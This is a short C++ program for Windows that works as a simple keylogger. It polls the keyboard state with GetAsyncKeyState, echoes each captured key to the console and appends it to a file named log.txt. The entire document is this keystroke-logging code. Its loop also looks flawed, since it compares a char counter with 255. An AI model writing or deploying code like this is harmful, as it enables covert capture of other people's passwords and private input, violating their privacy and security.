#include<fstream>
#include<Windows.h>
#include<iostream>

using namespace std;

int save(int key);

int main()
{
    char input;
    while (true)
    {for(input=8;input<=255;input++)
    {if(GetAsyncKeyState(input)==-32767)
      save(input);
    }
    }
    return 0;
}

int save(int key)
{
    cout<<(char)key<<endl;
    ofstream fout;
    fout.open("log.txt",ios::out|ios::app);
    fout<<(char)key;
    fout.close();
    return 0;
    
}